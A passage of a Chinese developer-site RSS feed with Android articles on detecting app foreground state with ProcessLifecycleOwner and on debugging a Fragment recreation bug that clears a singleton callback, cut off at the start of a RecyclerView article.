<h2 data-id="heading-1">二、官方首选方案：ProcessLifecycleOwner（强烈推荐）</h2>
<p>Google在AndroidX Lifecycle库中提供<strong>专为应用级生命周期设计</strong>的组件，原理清晰、无权限要求、兼容性好。</p>
<h3 data-id="heading-2">✨ 核心优势</h3>
<ul>
<li>基于所有Activity生命周期聚合判断（非反射/系统API）</li>
<li><code>onStart</code> = <strong>首个Activity可见</strong>（应用进入前台）<br/>
<code>onStop</code> = <strong>最后一个Activity不可见</strong>（应用进入后台）</li>
<li>回调在<strong>主线程</strong>，安全操作UI</li>
<li>无视透明Activity、DialogFragment等干扰</li>
<li>支持Android 4.0+（API 14+），经亿级应用验证</li>
</ul>
<h3 data-id="heading-3">🛠 集成步骤（Kotlin示例）</h3>
<ol>
<li><strong>添加依赖</strong>（app/build.gradle）</li>
</ol>
<pre><code class="hljs language-gradle" lang="gradle">dependencies {
    implementation "androidx.lifecycle:lifecycle-process:2.7.0" // 使用最新稳定版
    // 如需Java注解方式（不推荐新项目）：implementation "androidx.lifecycle:lifecycle-common-java8:2.7.0"
}
</code></pre>
<ol start="2">
<li><strong>创建观察者</strong></li>
</ol>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AppLifecycleObserver</span> : <span class="hljs-type">DefaultLifecycleObserver</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isForeground = <span class="hljs-literal">false</span>

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStart</span><span class="hljs-params">(owner: <span class="hljs-type">LifecycleOwner</span>)</span></span> {
        <span class="hljs-keyword">if</span> (!isForeground) {
            isForeground = <span class="hljs-literal">true</span>
            Log.d(<span class="hljs-string">"AppStatus"</span>, <span class="hljs-string">"✅ 应用进入前台"</span>)
            <span class="hljs-comment">// 业务逻辑：恢复播放、刷新数据等</span>
        }
    }

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStop</span><span class="hljs-params">(owner: <span class="hljs-type">LifecycleOwner</span>)</span></span> {
        <span class="hljs-keyword">if</span> (isForeground) {
            isForeground = <span class="hljs-literal">false</span>
            Log.d(<span class="hljs-string">"AppStatus"</span>, <span class="hljs-string">"⏸️ 应用进入后台"</span>)
            <span class="hljs-comment">// 业务逻辑：暂停任务、保存状态等</span>
        }
    }
}
</code></pre>
<ol start="3">
<li><strong>在Application中注册</strong></li>
</ol>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplication</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()
        ProcessLifecycleOwner.<span class="hljs-keyword">get</span>().lifecycle.addObserver(AppLifecycleObserver())
    }
}
</code></pre>
<blockquote>
<p>💡 <strong>关键细节</strong></p>
<ul>
<li>使用<code>DefaultLifecycleObserver</code>（接口）替代<code>@OnLifecycleEvent</code>注解（反射开销，新版已标记Deprecated）</li>
<li>内部通过<code>ActivityLifecycleCallbacks</code>自动管理Activity计数，<strong>无需手动维护栈</strong></li>
<li>回调时机：<code>onStart</code>在第一个Activity的<code>onStart()</code>后；<code>onStop</code>在最后一个Activity的<code>onStop()</code>后</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-4">三、边界场景与增强策略</h2>
<h3 data-id="heading-5">🔒 多进程应用</h3>
<ul>
<li><code>ProcessLifecycleOwner</code><strong>仅监控主进程</strong>的Activity</li>
<li><strong>方案</strong>：子进程通过AIDL/Binder向主进程上报状态，或子进程独立使用轻量判断（如结合<code>ActivityManager</code>自查）</li>
</ul>
<h3 data-id="heading-6">📱 厂商ROM兼容性</h3>
<ul>
<li>华为/小米等定制系统可能延迟<code>onStop</code>（如快速切回）</li>
<li><strong>增强建议</strong>：
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 结合屏幕状态辅助判断（需权限：android.permission.READ_PHONE_STATE）</span>
<span class="hljs-keyword">val</span> isScreenOn = (getSystemService(Context.POWER_SERVICE) <span class="hljs-keyword">as</span> PowerManager).isInteractive
<span class="hljs-keyword">if</span> (!isForeground &amp;&amp; !isScreenOn) {
    <span class="hljs-comment">// 可能因锁屏触发后台，避免误判为用户主动切出</span>
}
</code></pre>
</li>
</ul>
<h3 data-id="heading-7">🌐 特殊场景补充</h3>





















<table><thead><tr><th>场景</th><th>建议</th></tr></thead><tbody><tr><td>需判断“当前Activity是否在前台”</td><td>使用<code>Activity.onResume()</code>/<code>onPause()</code>（单Activity级）</td></tr><tr><td>需区分“锁屏导致后台” vs “用户切到其他App”</td><td>结合<code>ScreenStateReceiver</code>监听屏幕开关</td></tr><tr><td>Android 10+后台限制</td><td>判断逻辑本身不受影响，但后台任务需适配WorkManager</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-8">四、方案对比速查表</h2>








































<table><thead><tr><th>方案</th><th>可靠性</th><th>权限要求</th><th>实时性</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>ProcessLifecycleOwner</strong></td><td>⭐⭐⭐⭐⭐</td><td>无</td><td>高</td><td><strong>99%应用级判断首选</strong></td></tr><tr><td>ActivityLifecycleCallbacks（手动计数）</td><td>⭐⭐⭐</td><td>无</td><td>高</td><td>需深度定制计数逻辑时</td></tr><tr><td>UsageStatsManager</td><td>⭐⭐</td><td>需用户授权</td><td>中（秒级延迟）</td><td>无其他方案时的备选</td></tr><tr><td>ActivityManager（旧版）</td><td>⭐</td><td>高危权限</td><td>低</td><td><strong>已淘汰，切勿使用</strong></td></tr></tbody></table>
<hr/>
<h2 data-id="heading-9">五、最佳实践 checklist</h2>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 优先使用<code>ProcessLifecycleOwner</code> + <code>DefaultLifecycleObserver</code></li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 避免在<code>onStop</code>中执行耗时操作（系统可能快速杀死进程）</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 后台操作使用<code>WorkManager</code>替代AlarmManager/Handler</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 测试覆盖：快速切换、锁屏、来电中断、多Activity跳转</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 日志埋点验证回调时机（尤其厂商机）</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> 不要依赖“进程是否存活”判断前后台（进程可能驻留后台）</li>
</ul>
<hr/>
<h2 data-id="heading-10">结语</h2>
<p>判断应用前后台状态，本质是<strong>理解Android生命周期设计哲学</strong>：</p>
<blockquote>
<p>“关注用户是否与应用交互，而非进程是否运行。”</p>
</blockquote>
<p><code>ProcessLifecycleOwner</code>作为Google官方方案，以最小成本提供最高可靠性。在绝大多数业务场景中，它应是你的<strong>唯一选择</strong>。对于极端定制需求（如金融级安全校验），可结合屏幕状态、窗口焦点等做增强判断，但切勿本末倒置。</p>
<p><strong>记住</strong>：没有100%完美的方案，但有99%场景下足够优雅的解法。选择经过验证的现代API，把精力留给真正创造价值的业务逻辑。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Fragment和Activity生命周期管理的巨大区别]]></title>    <link>https://juejin.cn/post/7603186080493846579</link>    <guid>https://juejin.cn/post/7603186080493846579</guid>    <pubDate>2026-02-05T11:45:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603186080493846579" data-draft-id="7602965400809701426" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Fragment和Activity生命周期管理的巨大区别"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-05T11:45:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GoldenPlayer"/> <meta itemprop="url" content="https://juejin.cn/user/2999123453948119"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Fragment和Activity生命周期管理的巨大区别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2999123453948119/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GoldenPlayer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T11:45:08.000Z" title="Thu Feb 05 2026 11:45:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs language-scss" lang="scss"># Fragment重建之谜：我的回调为何在 <span class="hljs-built_in">onResume</span>() 时离奇消失？

&gt; “快跟我说说，你是怎么把庐江城攻下来的？” —— 袁术
&gt;
&gt; “主公，此事说来话长，其中颇为诡异……” —— 孙策


## 案发现场

想象一个场景：我们的App可以被设置为系统的“默认电话应用”。当用户在手机设置里，将我们的App从“默认”宝座上撤下来，换回系统自带的电话App，然后再切回我们的App时，一个诡异的NullPointerException（或者是一个依赖回调的逻辑失效）发生了。

问题出在ManageFragment的<span class="hljs-built_in">onResume</span>()方法里。我在这里需要使用一个通过AirIMEngine单例设置的回调，但在出事时，这个回调对象竟然是null！

```kotlin
<span class="hljs-comment">// in ManageFragment.kt</span>
override fun <span class="hljs-built_in">onResume</span>() {
    super<span class="hljs-selector-class">.onResume</span>()

    <span class="hljs-comment">// 尝试使用回调，但AirIMEngine.getCallback()返回了null，导致后续逻辑崩溃</span>
    AirIMEngine<span class="hljs-selector-class">.getCallback</span>()<span class="hljs-selector-class">.doSomething</span>() <span class="hljs-comment">// 崩溃发生在这里！</span>
}
</code></pre>
<p>这太奇怪了！因为我非常确定，在onViewCreated()里，我已经把回调设置好了：</p>
<p>kotlin</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// in ManageFragment.kt</span>
<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onViewCreated</span><span class="hljs-params">(view: <span class="hljs-type">View</span>, savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
    <span class="hljs-keyword">super</span>.onViewCreated(view, savedInstanceState)
    Log.d(TAG, <span class="hljs-string">"onViewCreated: 设置回调"</span>)
    AirIMEngine.setConnectStateCallback(iMConnectCallback) <span class="hljs-comment">// 明明在这里设置了！</span>
}
</code></pre>
<p>我们都知道，Fragment的生命周期是onViewCreated() -&gt; onStart() -&gt; onResume()。既然onViewCreated执行了，回调就应该在那里。为什么到了onResume，它就“人间蒸发”了呢？</p>
<h2 data-id="heading-0">初步排查与“现场急救”</h2>
<p>面对线上可能的崩溃，第一反应是先解决问题。最直接的“暴力”修复方案是在onResume里再加一次检查和设置：</p>
<p>kotlin</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// in ManageFragment.kt</span>
<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onResume</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">super</span>.onResume()

    <span class="hljs-comment">// 如果发现回调没了，就再设置一次</span>
    <span class="hljs-keyword">if</span> (!AirIMEngine.hasCallback()) {
        Log.w(TAG, <span class="hljs-string">"onResume: 回调丢失了！重新设置！"</span>)
        AirIMEngine.setConnectStateCallback(iMConnectCallback)
    }

    AirIMEngine.getCallback().doSomething() <span class="hljs-comment">// 这下安全了</span>
}
</code></pre>
<p>这段代码像一个“创可贴”，它能完美地解决崩溃。但是，作为有追求的开发者，我们不能满足于此。<strong>回调为什么会丢失？</strong> 这个问题就像一根刺，不拔不快。不搞清楚根本原因，难保它不会在别的地方以更诡异的形式再次出现。</p>
<h2 data-id="heading-1">深入调查：找到“另一个你”</h2>
<p>为了找到真相，我祭出了Log大法，在onViewCreated和onDestroy里打印出this实例的哈希值。当我再次复现操作后，Logcat里的日志让我大跌眼镜：</p>
<p>log</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// 更改默认应用，返回App后...</span>
D/MyLog: ManageFragment &gt; onViewCreated, <span class="hljs-keyword">this</span>:ManageFragment{**1f02326**}
D/MyLog: Manage-Fragment &gt; onViewCreated, <span class="hljs-keyword">this</span>:ManageFragment{**47cf2fb**}
D/MyLog: ManageFragment &gt; onDestroy, <span class="hljs-keyword">this</span>:ManageFragment{**1f02326**}
</code></pre>
<h2 data-id="heading-2">真相大白！</h2>
<p>在返回MainActivity的那一刻，系统里竟然出现了两个ManageFragment的实例！</p>
<ol>
<li>一个实例（我们叫它F_A {1f02326}）先被创建，并执行了onViewCreated。</li>
<li>紧接着，另一个全新的实例（F_B {47cf2fb}）也被创建，并执行了onViewCreated。</li>
<li>最关键的是，在这一切之后，第一个实例F_A的onDestroy方法被调用了。</li>
</ol>
<p>现在，我们可以完整地还原整个“犯罪过程”了：</p>
<ol>
<li>更改默认电话App被系统视为一次重大的“配置变更”（Configuration Change），系统决定销毁并重建我们的MainActivity。</li>
<li>MainActivity重建开始，FragmentManager从savedInstanceState中，自动恢复了它之前管理的ManageFragment实例，这就是F_A。</li>
<li>F_A执行onViewCreated，调用AirIMEngine.setConnectStateCallback()，此时单例中的回调被成功设置为F_A的iMConnectCallback实例。</li>
<li>然而，在MainActivity的onCreate方法中，很可能存在这样一段代码：<code>supportFragmentManager.beginTransaction().replace(R.id.container, new ManageFragment()).commit()</code>。这段代码并不知道FragmentManager已经恢复了一个Fragment，它只是忠实地执行指令——创建并添加一个全新的ManageFragment实例，也就是F_B。</li>
<li>F_B执行onViewCreated，再次调用AirIMEngine.setConnectStateCallback()，此时单例中的回调被覆盖为F_B的iMConnectCallback实例。</li>
<li>replace事务的执行，意味着容器中所有旧的Fragment都将被移除。因此，刚刚被恢复的F_A被立即标记为销毁。</li>
<li>F_A的onDestroy方法被触发。在onDestroy中，我们通常会清理资源，调用了AirIMEngine.removeCallback()。</li>
<li>致命一击：removeCallback()将AirIMEngine单例中的回调设置为了null。它清除了F_B刚刚才设置好的回调！</li>
<li>最后，F_B的onResume方法终于执行，当它尝试去获取回调时，发现它已经在上一步被F_A的“临终遗言”给清除了。</li>
</ol>
<p>这个过程完美解释了“回调离奇失踪”的现象。其根源在于<strong>FragmentManager的自动恢复机制和我们代码中手动的Fragment事务</strong>发生了冲突。</p>
<h2 data-id="heading-3">终极解决方案：相信savedInstanceState</h2>
<p>这个问题的解决方案非常简单，也是Google官方推荐的最佳实践。在Activity的onCreate方法中，将所有手动的Fragment事务都包裹在一个<code>if (savedInstanceState == null)</code>的判断里：</p>
<p>kotlin</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// in MainActivity.kt</span>
<span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
    <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
    setContentView(R.layout.activity_main)

    <span class="hljs-comment">// 关键！只在Activity首次创建时才手动添加Fragment</span>
    <span class="hljs-keyword">if</span> (savedInstanceState == <span class="hljs-literal">null</span>) {
        supportFragmentManager.beginTransaction()
            .replace(R.id.fragment_container, ManageFragment.newInstance())
            .commit()
    }
    <span class="hljs-comment">// 如果savedInstanceState不是null，说明Activity正在从之前的状态中恢复，</span>
    <span class="hljs-comment">// FragmentManager会自动为我们恢复Fragment，我们无需再做任何事。</span>
}
</code></pre>
<ul>
<li>当Activity首次启动时，savedInstanceState为null，我们手动创建并添加Fragment。</li>
<li>当Activity因为配置变更被重建时，savedInstanceState不再为null，if判断块不会执行，我们把舞台完全交给FragmentManager，让它从容地恢复之前的Fragment实例。</li>
</ul>
<p>这样一来，就不会有第二个Fragment实例来捣乱，生命周期也就恢复了正常，回调丢失的问题自然迎刃而解。</p>
<h2 data-id="heading-4">结案陈词</h2>
<p>这次“探案”经历给了我们几个深刻的教训：</p>
<ol>
<li><strong>永远用<code>if (savedInstanceState == null)</code>保护你的首次Fragment事务。</strong>  这是处理Activity重建时Fragment状态的黄金法则。</li>
<li><strong>警惕单例（Singleton）与生命周期的爱恨情仇。</strong>  当一个有生命周期的组件（如Fragment）去修改一个全局单例的状态时，尤其要小心在重建过程中新旧实例交替时可能引发的竞态条件。</li>
<li><strong>日志是你的“显微镜”。</strong>  当你遇到看似不合逻辑的生命周期问题时，在关键节点打印出实例的哈希码（<code>this</code>），往往能帮你发现“另一个你”的存在。</li>
</ol>
<p>希望这次的分享能帮助大家在Fragment的“深水区”里游得更稳。如果你也遇到过类似的“诡异”问题，欢迎在评论区分享你的故事</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android RecyclerView 性能优化]]></title>    <link>https://juejin.cn/post/7602991346585894946</link>    <guid>https://juejin.cn/post/7602991346585894946</guid>    <pubDate>2026-02-05T13:01:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602991346585894946" data-draft-id="7603043152673193999" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android RecyclerView 性能优化"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-05T13:01:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Fushize"/> <meta itemprop="url" content="https://juejin.cn/user/2367696439872411"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android RecyclerView 性能优化
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2367696439872411/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Fushize
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T13:01:31.000Z" title="Thu Feb 05 2026 13:01:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 